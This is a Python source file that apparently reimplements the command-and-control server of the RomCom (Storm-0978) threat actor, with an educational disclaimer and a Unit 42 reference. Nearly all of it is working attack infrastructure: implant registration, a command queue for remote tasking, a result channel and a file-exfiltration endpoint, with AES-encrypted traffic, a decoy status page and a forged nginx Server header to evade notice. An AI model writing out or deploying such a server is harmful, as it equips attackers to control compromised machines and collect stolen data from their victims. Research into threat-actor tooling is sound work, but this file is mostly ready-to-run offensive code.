# RomCom (Storm-0978) - HTTP REST C2 Server
# Custom C2 server using RESTful HTTP API with AES-256 encrypted payloads
# MITRE ATT&CK: T1071.001 (Web Protocols), T1573.001 (Symmetric Cryptography)

# For educational and research purposes only
# Author: Nour A
# Reference: https://unit42.paloaltonetworks.com/romcom-threat-actor/

import socket
import struct
import threading
import hashlib
import os
import sys
import json
import base64
import time
import re
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# C2 encryption key (derived from shared secret)
C2_KEY = hashlib.sha256(b"romcom-storm0978-c2-key").digest()


def aes_encrypt(plaintext, key=C2_KEY):
    """AES-256-CBC encryption."""
    if HAS_CRYPTO:
        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ct = cipher.encrypt(pad(plaintext, AES.block_size))
        return base64.b64encode(iv + ct).decode()
    else:
        return base64.b64encode(plaintext).decode()


def aes_decrypt(ciphertext_b64, key=C2_KEY):
    """AES-256-CBC decryption."""
    if HAS_CRYPTO:
        raw = base64.b64decode(ciphertext_b64)
        iv = raw[:16]
        ct = raw[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ct), AES.block_size)
    else:
        return base64.b64decode(ciphertext_b64)


class ImplantSession:
    """Tracks a single implant session."""
    def __init__(self, session_id, ip, hostname="", os_info=""):
        self.session_id = session_id
        self.ip = ip
        self.hostname = hostname
        self.os_info = os_info
        self.first_seen = datetime.now()
        self.last_beacon = datetime.now()
        self.command_queue = []
        self.results = []
        self.beacon_count = 0


class RomComC2Handler(BaseHTTPRequestHandler):
    """HTTP request handler for the RomCom C2 server.
    
    API endpoints mimic a legitimate REST API:
    - POST /api/v1/auth/token     -> implant registration
    - GET  /api/v1/tasks          -> command polling (beacon)
    - POST /api/v1/tasks/result   -> command result upload
    - POST /api/v1/files/upload   -> file exfiltration
    - GET  /api/v1/health         -> heartbeat/keepalive
    """

    sessions = {}
    server_key = C2_KEY

    def log_message(self, format, *args):
        """Custom log format."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        sys.stdout.write(f"  [{timestamp}] {args[0]}\n")

    def send_json(self, status, data):
        """Send JSON response with appropriate headers."""
        body = json.dumps(data).encode()
        if status == 200:
            encrypted = aes_encrypt(body, self.server_key)
            response = json.dumps({"data": encrypted, "enc": True}).encode()
        else:
            response = body

        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(response))
        self.send_header("Server", "nginx/1.24.0")
        self.send_header("X-Request-ID", hashlib.md5(
            os.urandom(8)).hexdigest()[:12])
        self.end_headers()
        self.wfile.write(response)

    def read_body(self):
        """Read and parse request body."""
        content_length = int(self.headers.get("Content-Length", 0))
        if content_length > 0:
            raw = self.rfile.read(content_length)
            try:
                data = json.loads(raw)
                # decrypt if encrypted
                if data.get("enc"):
                    decrypted = aes_decrypt(data["data"], self.server_key)
                    return json.loads(decrypted)
                return data
            except (json.JSONDecodeError, Exception):
                return {"raw": raw.decode(errors="ignore")}
        return {}

    def do_GET(self):
        parsed = urlparse(self.path)

        if parsed.path == "/api/v1/health":
            self.handle_health()
        elif parsed.path == "/api/v1/tasks":
            self.handle_task_poll(parsed)
        elif parsed.path == "/":
            # serve a fake page to look like a legitimate service
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>Service Status: OK</h1>")
        else:
            self.send_json(404, {"error": "Not found"})

    def do_POST(self):
        parsed = urlparse(self.path)

        if parsed.path == "/api/v1/auth/token":
            self.handle_registration()
        elif parsed.path == "/api/v1/tasks/result":
            self.handle_task_result()
        elif parsed.path == "/api/v1/files/upload":
            self.handle_file_upload()
        else:
            self.send_json(404, {"error": "Not found"})

    def handle_health(self):
        """Heartbeat endpoint."""
        self.send_json(200, {
            "status": "healthy",
            "uptime": time.time(),
            "sessions": len(self.sessions)
        })

    def handle_registration(self):
        """Handle new implant registration."""
        body = self.read_body()
        session_id = hashlib.md5(
            f"{self.client_address[0]}:{body.get('hostname', '')}:{time.time()}"
            .encode()).hexdigest()[:12]

        session = ImplantSession(
            session_id=session_id,
            ip=self.client_address[0],
            hostname=body.get("hostname", "unknown"),
            os_info=body.get("os", "unknown")
        )
        self.sessions[session_id] = session

        print(f"\n  [NEW IMPLANT] {session_id}")
        print(f"    IP: {session.ip}")
        print(f"    Hostname: {session.hostname}")
        print(f"    OS: {session.os_info}")

        self.send_json(200, {
            "session_id": session_id,
            "beacon_interval": 30,
            "jitter": 5,
        })

    def handle_task_poll(self, parsed):
        """Handle implant polling for tasks (beacon)."""
        params = parse_qs(parsed.query)
        session_id = params.get("sid", [None])[0]

        if not session_id or session_id not in self.sessions:
            self.send_json(401, {"error": "Invalid session"})
            return

        session = self.sessions[session_id]
        session.last_beacon = datetime.now()
        session.beacon_count += 1

        # return pending commands
        tasks = []
        while session.command_queue:
            tasks.append(session.command_queue.pop(0))

        self.send_json(200, {"tasks": tasks})

    def handle_task_result(self):
        """Handle implant sending command results."""
        body = self.read_body()
        session_id = body.get("session_id", "")

        if session_id not in self.sessions:
            self.send_json(401, {"error": "Invalid session"})
            return

        session = self.sessions[session_id]
        result = {
            "task_id": body.get("task_id", ""),
            "output": body.get("output", ""),
            "timestamp": datetime.now().isoformat()
        }
        session.results.append(result)

        print(f"\n  [RESULT] {session_id} -> Task {result['task_id']}")
        output = result["output"][:200] if result["output"] else "(empty)"
        print(f"    Output: {output}")

        self.send_json(200, {"status": "received"})

    def handle_file_upload(self):
        """Handle file exfiltration from implant."""
        body = self.read_body()
        session_id = body.get("session_id", "")
        filename = body.get("filename", "unknown")
        file_data = body.get("data", "")

        print(f"\n  [EXFIL] {session_id} -> {filename}")
        print(f"    Size: {len(file_data)} bytes (b64)")

        # would save to staging directory
        self.send_json(200, {"status": "uploaded", "filename": filename})


class RomComC2Server:
    """Main C2 server controller."""

    def __init__(self, host="0.0.0.0", port=8443):
        self.host = host
        self.port = port
        self.server = None

    def start(self):
        """Start the C2 server."""
        self.server = HTTPServer((self.host, self.port), RomComC2Handler)

        print(f"[+] RomCom C2 listening on {self.host}:{self.port}")
        print(f"[+] Encryption: {'AES-256-CBC' if HAS_CRYPTO else 'Base64 only'}")
        print(f"[+] Endpoints:")
        print(f"    POST /api/v1/auth/token    - Registration")
        print(f"    GET  /api/v1/tasks?sid=X   - Task polling")
        print(f"    POST /api/v1/tasks/result  - Result upload")
        print(f"    POST /api/v1/files/upload  - File exfiltration")
        print(f"    GET  /api/v1/health        - Heartbeat")
        print()

        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Shutting down C2...")
            self.server.shutdown()
            self._print_summary()

    def _print_summary(self):
        print()
        print("=" * 50)
        print("ROMCOM C2 SESSION SUMMARY")
        print("=" * 50)
        for sid, session in RomComC2Handler.sessions.items():
            print(f"  Session: {sid}")
            print(f"    Host: {session.hostname} ({session.ip})")
            print(f"    First seen: {session.first_seen}")
            print(f"    Beacons: {session.beacon_count}")
            print(f"    Results: {len(session.results)}")
        print("=" * 50)


def main():
    print("=" * 70)
    print("ROMCOM (STORM-0978) HTTP REST C2 SERVER")
    print("AES-Encrypted RESTful Command and Control")
    print("=" * 70)
    print()
    print("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
    print()

    host = "127.0.0.1"
    port = 8443
    if len(sys.argv) > 1:
        port = int(sys.argv[1])

    server = RomComC2Server(host=host, port=port)
    server.start()


if __name__ == "__main__":
    main()
